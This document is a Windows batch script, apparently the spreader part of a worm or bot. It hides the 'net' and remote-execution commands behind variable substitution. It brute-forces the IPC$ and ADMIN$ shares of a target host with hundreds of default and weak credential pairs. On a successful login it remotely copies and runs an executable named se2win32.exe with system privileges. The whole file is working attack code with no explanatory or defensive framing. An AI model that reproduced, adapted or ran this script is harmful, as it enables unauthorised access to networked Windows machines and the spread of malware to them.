@echo off
:begin
set Q=n
set W=e
set E=t
set R=b
set T=o
%Q%%W%%E% use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto adad
%Q%%W%%E% use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto blkad
%Q%%W%%E% use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
%Q%%W%%E% use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto adtest
%Q%%W%%E% use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto adtestt
%Q%%W%%E% use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto adtemp
%Q%%W%%E% use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto adtempp
%Q%%W%%E% use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto adpass
%Q%%W%%E% use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto adpassw
%Q%%W%%E% use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto adadmin
%Q%%W%%E% use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
%Q%%W%%E% use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto adminch
%Q%%W%%E% use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
%Q%%W%%E% use \\%1\ipc$ "1234" /user:Administrator
if not errorlevel 1 goto whee
%Q%%W%%E% use \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto Administrator-qwerty
%Q%%W%%E% use \\%1\ipc$ "qwerty123" /user:Administrator
if not errorlevel 1 goto Administrator-qwerty123
%Q%%W%%E% use \\%1\ipc$ "Administrator1" /user:Administrator
if not errorlevel 1 goto Administrator-Administrator1
%Q%%W%%E% use \\%1\ipc$ "Administrator123" /user:Administrator
if not errorlevel 1 goto Administrator-Administrator123
%Q%%W%%E% use \\%1\ipc$ "system" /user:Administrator
if not errorlevel 1 goto Administrator-system
%Q%%W%%E% use \\%1\ipc$ "netlink" /user:Administrator
if not errorlevel 1 goto Administrator-netlink
%Q%%W%%E% use \\%1\ipc$ "manager" /user:Administrator
if not errorlevel 1 goto Administrator-manager
%Q%%W%%E% use \\%1\ipc$ "operator" /user:Administrator
if not errorlevel 1 goto Administrator-operator
%Q%%W%%E% use \\%1\ipc$ "fuck" /user:Administrator
if not errorlevel 1 goto Administrator-fuck
%Q%%W%%E% use \\%1\ipc$ "fuckyou" /user:Administrator
if not errorlevel 1 goto Administrator-fuckyou
%Q%%W%%E% use \\%1\ipc$ "penis" /user:Administrator
if not errorlevel 1 goto Administrator-penis
%Q%%W%%E% use \\%1\ipc$ "dick" /user:Administrator
if not errorlevel 1 goto Administrator-dick
%Q%%W%%E% use \\%1\ipc$ "cunt" /user:Administrator
if not errorlevel 1 goto Administrator-cunt
%Q%%W%%E% use \\%1\ipc$ "cock" /user:Administrator
if not errorlevel 1 goto Administrator-cock
%Q%%W%%E% use \\%1\ipc$ "fuckface" /user:Administrator
if not errorlevel 1 goto Administrator-fuckface
%Q%%W%%E% use \\%1\ipc$ "die" /user:Administrator
if not errorlevel 1 goto Administrator-die
%Q%%W%%E% use \\%1\ipc$ "hacker" /user:Administrator
if not errorlevel 1 goto Administrator-hacker
%Q%%W%%E% use \\%1\ipc$ "database" /user:database
if not errorlevel 1 goto database-database
%Q%%W%%E% use \\%1\ipc$ "123" /user:database
if not errorlevel 1 goto database-123
%Q%%W%%E% use \\%1\ipc$ "password" /user:database
if not errorlevel 1 goto database-password
%Q%%W%%E% use \\%1\ipc$ "pass" /user:database
if not errorlevel 1 goto database-pass
%Q%%W%%E% use \\%1\ipc$ "datapass" /user:database
if not errorlevel 1 goto database-datapass
%Q%%W%%E% use \\%1\ipc$ "adminpass" /user:Administrator
if not errorlevel 1 goto Administrator-adminpass
%Q%%W%%E% use \\%1\ipc$ "aaa" /user:Administrator
if not errorlevel 1 goto Administrator-aaa
%Q%%W%%E% use \\%1\ipc$ "abc" /user:Administrator
if not errorlevel 1 goto Administrator-abc
%Q%%W%%E% use \\%1\ipc$ "abcd" /user:Administrator

if not errorlevel 1 goto Administrator-abcd
%Q%%W%%E% use \\%1\ipc$ "access" /user:Administrator
if not errorlevel 1 goto Administrator-access
%Q%%W%%E% use \\%1\ipc$ "help" /user:Administrator
if not errorlevel 1 goto Administrator-help
%Q%%W%%E% use \\%1\ipc$ "asd" /user:Administrator
if not errorlevel 1 goto Administrator-asd
%Q%%W%%E% use \\%1\ipc$ "asm" /user:Administrator
if not errorlevel 1 goto Administrator-asm
%Q%%W%%E% use \\%1\ipc$ "asdf" /user:Administrator
if not errorlevel 1 goto Administrator-asdf
%Q%%W%%E% use \\%1\ipc$ "fdsa" /user:Administrator
if not errorlevel 1 goto Administrator-fdsa
%Q%%W%%E% use \\%1\ipc$ "ibm" /user:Administrator
if not errorlevel 1 goto Administrator-ibm
%Q%%W%%E% use \\%1\ipc$ "!@#$" /user:Administrator
if not errorlevel 1 goto Administrator-!@#$
%Q%%W%%E% use \\%1\ipc$ "!@#" /user:Administrator
if not errorlevel 1 goto Administrator-!@#
%Q%%W%%E% use \\%1\ipc$ "!@#$%" /user:Administrator
if not errorlevel 1 goto Administrator-!@#$%
%Q%%W%%E% use \\%1\ipc$ "!@#$%^" /user:Administrator
if not errorlevel 1 goto Administrator-!@#$%^
%Q%%W%%E% use \\%1\ipc$ "modem" /user:Administrator
if not errorlevel 1 goto Administrator-modem
%Q%%W%%E% use \\%1\ipc$ "xyz" /user:Administrator
if not errorlevel 1 goto Administrator-xyz
%Q%%W%%E% use \\%1\ipc$ "unix" /user:Administrator
if not errorlevel 1 goto Administrator-unix
%Q%%W%%E% use \\%1\ipc$ "windows" /user:Administrator
if not errorlevel 1 goto Administrator-windows
%Q%%W%%E% use \\%1\ipc$ "sys" /user:Administrator
if not errorlevel 1 goto Administrator-sys
%Q%%W%%E% use \\%1\ipc$ "sex" /user:Administrator
if not errorlevel 1 goto Administrator-sex
%Q%%W%%E% use \\%1\ipc$ "new" /user:Administrator
if not errorlevel 1 goto Administrator-new
%Q%%W%%E% use \\%1\ipc$ "hack" /user:Administrator
if not errorlevel 1 goto Administrator-hack
%Q%%W%%E% use \\%1\ipc$ "disc" /user:Administrator
if not errorlevel 1 goto Administrator-disc
%Q%%W%%E% use \\%1\ipc$ "dos" /user:Administrator
if not errorlevel 1 goto Administrator-dos
%Q%%W%%E% use \\%1\ipc$ "dog" /user:Administrator
if not errorlevel 1 goto Administrator-dog
%Q%%W%%E% use \\%1\ipc$ "cat" /user:Administrator
if not errorlevel 1 goto Administrator-cat
%Q%%W%%E% use \\%1\ipc$ "compaq" /user:Administrator
if not errorlevel 1 goto Administrator-compaq
%Q%%W%%E% use \\%1\ipc$ "passw0rd" /user:Administrator
if not errorlevel 1 goto Administrator-passw0rd
%Q%%W%%E% use \\%1\ipc$ "letmein" /user:Administrator
if not errorlevel 1 goto Administrator-letmein
%Q%%W%%E% use \\%1\ipc$ "manager" /user:Administrator
if not errorlevel 1 goto Administrator-manager
%Q%%W%%E% use \\%1\ipc$ "-" /user:Administrator
if not errorlevel 1 goto Administrator--
%Q%%W%%E% use \\%1\ipc$ "security" /user:Administrator
if not errorlevel 1 goto Administrator-security
%Q%%W%%E% use \\%1\ipc$ "adm" /user:Administrator
if not errorlevel 1 goto Administrator-adm
%Q%%W%%E% use \\%1\ipc$ "debug" /user:Administrator
if not errorlevel 1 goto Administrator-debug
%Q%%W%%E% use \\%1\ipc$ "tech" /user:Administrator
if not errorlevel 1 goto Administrator-tech
%Q%%W%%E% use \\%1\ipc$ "monitor" /user:Administrator
if not errorlevel 1 goto Administrator-monitor
%Q%%W%%E% use \\%1\ipc$ "god123" /user:Administrator
if not errorlevel 1 goto Administrator-god123
%Q%%W%%E% use \\%1\ipc$ "user" /user:Administrator
if not errorlevel 1 goto Administrator-user
%Q%%W%%E% use \\%1\ipc$ "none" /user:Administrator
if not errorlevel 1 goto Administrator-none
%Q%%W%%E% use \\%1\ipc$ "None" /user:Administrator
if not errorlevel 1 goto Administrator-None
%Q%%W%%E% use \\%1\ipc$ "r00t" /user:Administrator
if not errorlevel 1 goto Administrator-r00t
%Q%%W%%E% use \\%1\ipc$ "hello" /user:Administrator
if not errorlevel 1 goto Administrator-hello
%Q%%W%%E% use \\%1\ipc$ "hello1" /user:Administrator
if not errorlevel 1 goto Administrator-hello1
%Q%%W%%E% use \\%1\ipc$ "blank" /user:Administrator
if not errorlevel 1 goto Administrator-blank
%Q%%W%%E% use \\%1\ipc$ "00000" /user:Administrator
if not errorlevel 1 goto Administrator-00000

%Q%%W%%E% use \\%1\ipc$ "99999" /user:Administrator
if not errorlevel 1 goto Administrator-99999
%Q%%W%%E% use \\%1\ipc$ "gateway" /user:Administrator
if not errorlevel 1 goto Administrator-gateway
%Q%%W%%E% use \\%1\ipc$ "p4ssw0rd" /user:Administrator
if not errorlevel 1 goto Administrator-p4ssw0rd
%Q%%W%%E% use \\%1\ipc$ "daffyduck" /user:Administrator
if not errorlevel 1 goto Administrator-daffyduck
%Q%%W%%E% use \\%1\ipc$ "testing" /user:Administrator
if not errorlevel 1 goto Administrator-testing
%Q%%W%%E% use \\%1\ipc$ "testtest" /user:Administrator
if not errorlevel 1 goto Administrator-testtest
%Q%%W%%E% use \\%1\ipc$ "weed" /user:Administrator
if not errorlevel 1 goto Administrator-weed
%Q%%W%%E% use \\%1\ipc$ "qwertyuiop[]" /user:Administrator
if not errorlevel 1 goto Administrator-qwertyuiop[]
%Q%%W%%E% use \\%1\ipc$ "ohio" /user:Administrator
if not errorlevel 1 goto Administrator-ohio
%Q%%W%%E% use \\%1\ipc$ "texas" /user:Administrator
if not errorlevel 1 goto Administrator-texas
%Q%%W%%E% use \\%1\ipc$ "california" /user:Administrator
if not errorlevel 1 goto Administrator-california
%Q%%W%%E% use \\%1\ipc$ "parsnip" /user:Administrator
if not errorlevel 1 goto Administrator-parsnip
%Q%%W%%E% use \\%1\ipc$ "carrot" /user:Administrator
if not errorlevel 1 goto Administrator-carrot
%Q%%W%%E% use \\%1\ipc$ "egg" /user:Administrator
if not errorlevel 1 goto Administrator-egg
%Q%%W%%E% use \\%1\ipc$ "apple" /user:Administrator
if not errorlevel 1 goto Administrator-apple
%Q%%W%%E% use \\%1\ipc$ "slut" /user:Administrator
if not errorlevel 1 goto Administrator-slut
%Q%%W%%E% use \\%1\ipc$ "asdfghjkl" /user:Administrator
if not errorlevel 1 goto Administrator-asdfghjkl
%Q%%W%%E% use \\%1\ipc$ "zxcvbnm" /user:Administrator
if not errorlevel 1 goto Administrator-zxcvbnm
%Q%%W%%E% use \\%1\ipc$ "10987654321" /user:Administrator
if not errorlevel 1 goto Administrator-10987654321
%Q%%W%%E% use \\%1\ipc$ "sweetspud" /user:Administrator
if not errorlevel 1 goto Administrator-sweetspud
%Q%%W%%E% use \\%1\ipc$ "secret" /user:Administrator
if not errorlevel 1 goto Administrator-secret
%Q%%W%%E% use \\%1\ipc$ "windowsnt" /user:Administrator
if not errorlevel 1 goto Administrator-windowsnt
%Q%%W%%E% use \\%1\ipc$ "winnt" /user:Administrator
if not errorlevel 1 goto Administrator-winnt
%Q%%W%%E% use \\%1\ipc$ "win2k" /user:Administrator
if not errorlevel 1 goto Administrator-win2k
%Q%%W%%E% use \\%1\ipc$ "win2000" /user:Administrator
if not errorlevel 1 goto Administrator-win2000
%Q%%W%%E% use \\%1\ipc$ "win98" /user:Administrator
if not errorlevel 1 goto Administrator-win98
%Q%%W%%E% use \\%1\ipc$ "win95" /user:Administrator
if not errorlevel 1 goto Administrator-win95
%Q%%W%%E% use \\%1\ipc$ "winxp" /user:Administrator
if not errorlevel 1 goto Administrator-winxp
%Q%%W%%E% use \\%1\ipc$ "windowsxp" /user:Administrator
if not errorlevel 1 goto Administrator-windowsxp
%Q%%W%%E% use \\%1\ipc$ "windows2000" /user:Administrator
if not errorlevel 1 goto Administrator-windows2000
%Q%%W%%E% use \\%1\ipc$ "rotartsinimda" /user:Administrator
if not errorlevel 1 goto Administrator-rotartsinimda
%Q%%W%%E% use \\%1\IPC$ "" /user:sa
if not errorlevel 1 goto sa
%Q%%W%%E% use \\%1\IPC$ "" /user:administrator
if not errorlevel 1 goto blkad
%Q%%W%%E% use \\%1\IPC$ "" /user:amministratore
if not errorlevel 1 goto amministratore
%Q%%W%%E% use \\%1\IPC$ "" /user:forsterkning
if not errorlevel 1 goto forsterkning
%Q%%W%%E% use \\%1\IPC$ "" /user:Verwalter
if not errorlevel 1 goto Verwalter
%Q%%W%%E% use \\%1\IPC$ "" /user:user
if not errorlevel 1 goto userblank
%Q%%W%%E% use \\%1\IPC$ "" /user:administrador
if not errorlevel 1 goto spanishadmin
%Q%%W%%E% use \\%1\IPC$ "administrador" /user:administrador
if not errorlevel 1 goto spanishadmin2
%Q%%W%%E% use \\%1\IPC$ "default" /user:default
if not errorlevel 1 goto defdef
%Q%%W%%E% use \\%1\IPC$ "default" /user:user
if not errorlevel 1 goto defpass
%Q%%W%%E% use \\%1\IPC$ "user" /user:default
if not errorlevel 1 goto userdef
%Q%%W%%E% use \\%1\IPC$ "user" /user:user

if not errorlevel 1 goto useruser
%Q%%W%%E% use \\%1\IPC$ "12345" /user:administrator
if not errorlevel 1 goto administrator12345
%Q%%W%%E% use \\%1\IPC$ "password" /user:administrator
if not errorlevel 1 goto administratorpassword
%Q%%W%%E% use \\%1\IPC$ "1234" /user:administrator
if not errorlevel 1 goto administrator1234
%Q%%W%%E% use \\%1\IPC$ "123" /user:administrator
if not errorlevel 1 goto administrator123
%Q%%W%%E% use \\%1\IPC$ "123456" /user:administrator
if not errorlevel 1 goto administrator123456
%Q%%W%%E% use \\%1\IPC$ "administrator" /user:admin
if not errorlevel 1 goto adminadministrator
%Q%%W%%E% use \\%1\IPC$ "" /user:admin
if not errorlevel 1 goto adminblank
%Q%%W%%E% use \\%1\IPC$ "guest" /user:guest
if not errorlevel 1 goto guestguest
%Q%%W%%E% use \\%1\IPC$ "" /user:Administrateur
if not errorlevel 1 goto Administrateur
%Q%%W%%E% use \\%1\IPC$ "Administrateur" /user:Administrateur
if not errorlevel 1 goto Administrateurx2
%Q%%W%%E% use \\%1\IPC$ "student" /user:student
if not errorlevel 1 goto student
%Q%%W%%E% use \\%1\IPC$ "" /user:Invité
if not errorlevel 1 goto Invité
%Q%%W%%E% use \\%1\IPC$ "" /user:uzivatel
if not errorlevel 1 goto uzivatel
%Q%%W%%E% use \\%1\IPC$ "administrator" /user:administrator
if not errorlevel 1 goto adad
%Q%%W%%E% use \\%1\IPC$ "test" /user:administrator
if not errorlevel 1 goto adtest
%Q%%W%%E% use \\%1\IPC$ "test" /user:test
if not errorlevel 1 goto testt
%Q%%W%%E% use \\%1\IPC$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
%Q%%W%%E% use \\%1\IPC$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
%Q%%W%%E% use \\%1\IPC$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
%Q%%W%%E% use \\%1\IPC$ "pass" /user:administrator
if not errorlevel 1 goto adpass
%Q%%W%%E% use \\%1\IPC$ "password" /user:administrator
if not errorlevel 1 goto adpassw
%Q%%W%%E% use \\%1\IPC$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
%Q%%W%%E% use \\%1\IPC$ "root" /user:root
if not errorlevel 1 goto rootroot
%Q%%W%%E% use \\%1\IPC$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
%Q%%W%%E% use \\%1\IPC$ "admin" /user:admin
if not errorlevel 1 goto adminad
%Q%%W%%E% use \\%1\IPC$ "' /user:MERUSER
if not errorlevel 1 goto meruser
%Q%%W%%E% use \\%1\IPC$ "' /user:Extension
if not errorlevel 1 goto Extension
%Q%%W%%E% use \\%1\ipc$ "" /user:sa
if not errorlevel 1 goto sa
%Q%%W%%E% use \\%1\ipc$ "w2kserver" /user:w2kserver
if not errorlevel 1 goto w2k1
%Q%%W%%E% use \\%1\ipc$ "" /user:w2kserver
if not errorlevel 1 goto w2k2
%Q%%W%%E% use \\%1\ipc$ "proxy" /user:proxy
if not errorlevel 1 goto prox1
%Q%%W%%E% use \\%1\ipc$ "" /user:proxy
if not errorlevel 1 goto prox2
%Q%%W%%E% use \\%1\ipc$ "server" /user:server
if not errorlevel 1 goto server
%Q%%W%%E% use \\%1\ipc$ "" /user:server
if not errorlevel 1 goto server2
%Q%%W%%E% use \\%1\ipc$ "pc" /user:pc
if not errorlevel 1 goto pc
%Q%%W%%E% use \\%1\ipc$ "compaq" /user:compaq
if not errorlevel 1 goto compaq
%Q%%W%%E% use \\%1\ipc$ "" /user:compaq
if not errorlevel 1 goto compaq2
%Q%%W%%E% use \\%1\ipc$ "oemcomputer" /user:oemcomputer
if not errorlevel 1 goto oem1
%Q%%W%%E% use \\%1\ipc$ "" /user:oemcomputer
if not errorlevel 1 goto oem2
%Q%%W%%E% use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto blkad
%Q%%W%%E% use \\%1\ipc$ "" /user:amministratore
if not errorlevel 1 goto amministratore
%Q%%W%%E% use \\%1\ipc$ "" /user:forsterkning
if not errorlevel 1 goto forsterkning
%Q%%W%%E% use \\%1\ipc$ "" /user:Verwalter
if not errorlevel 1 goto Verwalter
%Q%%W%%E% use \\%1\ipc$ "" /user:user
if not errorlevel 1 goto userblank
%Q%%W%%E% use \\%1\ipc$ "" /user:administrador
if not errorlevel 1 goto spanishadmin
%Q%%W%%E% use \\%1\ipc$ "administrador" /user:administrador
if not errorlevel 1 goto spanishadmin2
%Q%%W%%E% use \\%1\ipc$ "default" /user:default
if not errorlevel 1 goto defdef
%Q%%W%%E% use \\%1\ipc$ "default" /user:user
if not errorlevel 1 goto defpass
%Q%%W%%E% use \\%1\ipc$ "user" /user:default
if not errorlevel 1 goto userdef
%Q%%W%%E% use \\%1\ipc$ "user" /user:user

if not errorlevel 1 goto useruser
%Q%%W%%E% use \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto administrator12345
%Q%%W%%E% use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto administratorpassword
%Q%%W%%E% use \\%1\ipc$ "1234" /user:administrator
if not errorlevel 1 goto administrator1234
%Q%%W%%E% use \\%1\ipc$ "123" /user:administrator
if not errorlevel 1 goto administrator123
%Q%%W%%E% use \\%1\ipc$ "123456" /user:administrator
if not errorlevel 1 goto administrator123456
%Q%%W%%E% use \\%1\ipc$ "administrator" /user:admin
if not errorlevel 1 goto adminadministrator
%Q%%W%%E% use \\%1\ipc$ "" /user:admin
if not errorlevel 1 goto adminblank
%Q%%W%%E% use \\%1\ipc$ "guest" /user:guest
if not errorlevel 1 goto guestguest
%Q%%W%%E% use \\%1\ipc$ "" /user:Administrateur
if not errorlevel 1 goto Administrateur
%Q%%W%%E% use \\%1\ipc$ "Administrateur" /user:Administrateur
if not errorlevel 1 goto Administrateurx2
%Q%%W%%E% use \\%1\ipc$ "student" /user:student
if not errorlevel 1 goto student
%Q%%W%%E% use \\%1\ipc$ "" /user:Invité
if not errorlevel 1 goto Invité
%Q%%W%%E% use \\%1\ipc$ "" /user:uzivatel
if not errorlevel 1 goto uzivatel
%Q%%W%%E% use \\%1\ipc$ "administrator" /user:administrator
if not errorlevel 1 goto adad
%Q%%W%%E% use \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto adtest
%Q%%W%%E% use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
%Q%%W%%E% use \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
%Q%%W%%E% use \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
%Q%%W%%E% use \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
%Q%%W%%E% use \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto adpass
%Q%%W%%E% use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto adpassw
%Q%%W%%E% use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
%Q%%W%%E% use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
%Q%%W%%E% use \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
%Q%%W%%E% use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
%Q%%W%%E% use /del \\%1\ADMIN$
%Q%%W%%E% use \\%1\ADMIN$ "" /user:administrator
if not errorlevel 1 goto blkad
%Q%%W%%E% use \\%1\ADMIN$ "administrator" /user:administrator
if not errorlevel 1 goto adad
%Q%%W%%E% use \\%1\ADMIN$ "test" /user:administrator
if not errorlevel 1 goto adtest
%Q%%W%%E% use \\%1\ADMIN$ "test" /user:test
if not errorlevel 1 goto testt
%Q%%W%%E% use \\%1\ADMIN$ "123" /user:administrator
if not errorlevel 1 goto adtestt
%Q%%W%%E% use \\%1\ADMIN$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
%Q%%W%%E% use \\%1\ADMIN$ "1234" /user:administrator
if not errorlevel 1 goto adtempp
%Q%%W%%E% use \\%1\ADMIN$ "pass" /user:administrator
if not errorlevel 1 goto adpass
%Q%%W%%E% use \\%1\ADMIN$ "password" /user:administrator
if not errorlevel 1 goto adpassw
%Q%%W%%E% use \\%1\ADMIN$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
%Q%%W%%E% use \\%1\ADMIN$ "root" /user:root
if not errorlevel 1 goto rootroot
%Q%%W%%E% use \\%1\ADMIN$ "Järjestelmänvalvoja" /user:administrator
if not errorlevel 1 goto adminch
%Q%%W%%E% use \\%1\ADMIN$ "admin" /user:admin
if not errorlevel 1 goto adminad
:blkad
%R%%T%%T%%E \\%1 -u administrator -p "" -s -c -f -d se2win32.exe
:adad
%R%%T%%T%%E \\%1 -u administrator -p "admin" -s -c -f -d se2win32.exe
:adadmin
%R%%T%%T%%E \\%1 -u administrator -p "administrator" -s -c -f -d se2win32.exe
:rootroot
%R%%T%%T%%E \\%1 -u root -p "root" -s -c -f -d se2win32.exe
:adminad
%R%%T%%T%%E \\%1 -u admin -p "admin" -s -c -f -d se2win32.exe
:adtest
%R%%T%%T%%E \\%1 -u administrator -p "test" -s -c -f -d se2win32.exe
:testt
%R%%T%%T%%E \\%1 -u test -p "test" -s -c -f -d se2win32.exe
:adtestt
%R%%T%%T%%E \\%1 -u administrator -p "123" -s -c -f -d se2win32.exe
:adtemp
%R%%T%%T%%E \\%1 -u administrator -p "temp" -s -c -f -d se2win32.exe
:adtempp
%R%%T%%T%%E \\%1 -u administrator -p "1234" -s -c -f -d se2win32.exe
:adpass

%R%%T%%T%%E \\%1 -u administrator -p "pass" -s -c -f -d se2win32.exe
:adpassw
%R%%T%%T%%E \\%1 -u administrator -p "password" -s -c -f -d se2win32.exe
:adminch
%R%%T%%T%%E \\%1 -u administrator -p "Järjestelmänvalvoja" -s -c -f -d se2win32.exe
%Q%%W%%E% use \\%1\ipc$ "xerox" /user:xerox
%Q%%W%%E% use \\%1\ipc$ "%1" /user:%1
%Q%%W%%E% use \\%1\ipc$ "administrator" /user:%1
%Q%%W%%E% use \\%1\ipc$ "%1" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "family" /user:family
%Q%%W%%E% use \\%1\ipc$ "" /user:family
%Q%%W%%E% use \\%1\ipc$ "dad" /user:dad
%Q%%W%%E% use \\%1\ipc$ "" /user:dad
%Q%%W%%E% use \\%1\ipc$ "kids" /user:kids
%Q%%W%%E% use \\%1\ipc$ "" /user:kids
%Q%%W%%E% use \\%1\ipc$ "HOME" /user:HOME
%Q%%W%%E% use \\%1\ipc$ "" /user:HOME
%Q%%W%%E% use \\%1\ipc$ "office" /user:office
%Q%%W%%E% use \\%1\ipc$ "" /user:office
%Q%%W%%E% use \\%1\ipc$ "office" /user:HOMe
%Q%%W%%E% use \\%1\ipc$ "AMD" /user:AMD
%Q%%W%%E% use \\%1\ipc$ "casa" /user:casa
%Q%%W%%E% use \\%1\ipc$ "" /user:casa
%Q%%W%%E% use \\%1\ipc$ "" /user:young
%Q%%W%%E% use \\%1\ipc$ "young" /user:young
%Q%%W%%E% use \\%1\ipc$ "JACKSON" /user:JACKSON
%Q%%W%%E% use \\%1\ipc$ "tim" /user:tim
%Q%%W%%E% use \\%1\ipc$ "temp" /user:temp
%Q%%W%%E% use \\%1\ipc$ "" /user:Gæst
%Q%%W%%E% use \\%1\ipc$ "" /user:ibm
%Q%%W%%E% use \\%1\ipc$ "es102" /user:es102
%Q%%W%%E% use \\%1\ipc$ "cs148" /user:cs148
%Q%%W%%E% use \\%1\ipc$ "SERVEUR" /user:SERVEUR
%Q%%W%%E% use \\%1\ipc$ "" /user:SERVEUR
%Q%%W%%E% use \\%1\ipc$ "cims" /user:cims
%Q%%W%%E% use \\%1\ipc$ "db2admin" /user:db2admin
%Q%%W%%E% use \\%1\ipc$ "" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "System4" /user:ownage
%Q%%W%%E% use \\%1\ipc$ "ownage" /user:System4
%Q%%W%%E% use \\%1\ipc$ "3cewumef" /user:winupdate
%Q%%W%%E% use \\%1\ipc$ "winupdate" /user:3cewumef
%Q%%W%%E% use \\%1\ipc$ "" /user:sa
%Q%%W%%E% use \\%1\ipc$ "w2kserver" /user:w2kserver
%Q%%W%%E% use \\%1\ipc$ "" /user:w2kserver
%Q%%W%%E% use \\%1\ipc$ "proxy" /user:proxy
%Q%%W%%E% use \\%1\ipc$ "System4" /user:ownage
%Q%%W%%E% use \\%1\ipc$ "ownage" /user:System4
%Q%%W%%E% use \\%1\ipc$ "" /user:proxy
%Q%%W%%E% use \\%1\ipc$ "server" /user:server
%Q%%W%%E% use \\%1\ipc$ "" /user:server
%Q%%W%%E% use \\%1\ipc$ "pc" /user:pc
%Q%%W%%E% use \\%1\ipc$ "compaq" /user:compaq
%Q%%W%%E% use \\%1\ipc$ "" /user:compaq
%Q%%W%%E% use \\%1\ipc$ "oemcomputer" /user:oemcomputer
%Q%%W%%E% use \\%1\ipc$ "" /user:oemcomputer
%Q%%W%%E% use \\%1\ipc$ "" /user:amministratore
%Q%%W%%E% use \\%1\ipc$ "" /user:forsterkning
%Q%%W%%E% use \\%1\ipc$ "" /user:Verwalter
%Q%%W%%E% use \\%1\ipc$ "" /user:user
%Q%%W%%E% use \\%1\ipc$ "" /user:administrador
%Q%%W%%E% use \\%1\ipc$ "administrador" /user:administrador
%Q%%W%%E% use \\%1\ipc$ "default" /user:default
%Q%%W%%E% use \\%1\ipc$ "default" /user:user
%Q%%W%%E% use \\%1\ipc$ "user" /user:default
%Q%%W%%E% use \\%1\ipc$ "user" /user:user
%Q%%W%%E% use \\%1\ipc$ "12345" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "password" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "1234" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "123" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "123456" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "123" /user:dn
%Q%%W%%E% use \\%1\ipc$ "1" /user:BA
%Q%%W%%E% use \\%1\ipc$ "administrator" /user:admin
%Q%%W%%E% use \\%1\ipc$ "" /user:admin
%Q%%W%%E% use \\%1\ipc$ "guest" /user:guest
%Q%%W%%E% use \\%1\ipc$ "" /user:Administrateur
%Q%%W%%E% use \\%1\ipc$ "Administrateur" /user:Administrateur
%Q%%W%%E% use \\%1\ipc$ "student" /user:student
%Q%%W%%E% use \\%1\ipc$ "" /user:Invité
%Q%%W%%E% use \\%1\ipc$ "" /user:uzivatel
%Q%%W%%E% use \\%1\ipc$ "" /user:3dstudio
%Q%%W%%E% use \\%1\ipc$ "admin" /user:wwwadmin
%Q%%W%%E% use \\%1\ipc$ "wwwadmin" /user:wwwadmin
%Q%%W%%E% use \\%1\ipc$ "database" /user:database
%Q%%W%%E% use \\%1\ipc$ "admin" /user:database
%Q%%W%%E% use \\%1\ipc$ "user" /user:user
%Q%%W%%E% use \\%1\ipc$ "admin" /user:user
%Q%%W%%E% use \\%1\ipc$ "admin" /user:Administrator
%Q%%W%%E% use \\%1\ipc$ "admin" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "admin123" /user:administrator

%Q%%W%%E% use \\%1\ipc$ "password" /user:administrato
%Q%%W%%E% use \\%1\ipc$ "administrator" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "changeme" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "root" /user:root
%Q%%W%%E% use \\%1\ipc$ "admin" /user:admin
%Q%%W%%E% use \\%1\ipc$ "1" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "12" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "123" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "1234" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "12345" /user:Administrator
%Q%%W%%E% use \\%1\ipc$ "123456" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "test" /user:test
%Q%%W%%E% use \\%1\ipc$ "test123" /user:test
%Q%%W%%E% use \\%1\ipc$ "administrator" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "test" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "test" /user:test
%Q%%W%%E% use \\%1\ipc$ "test123" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "temp" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "temp123" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "pass" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "password" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "admin" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "root" /user:root
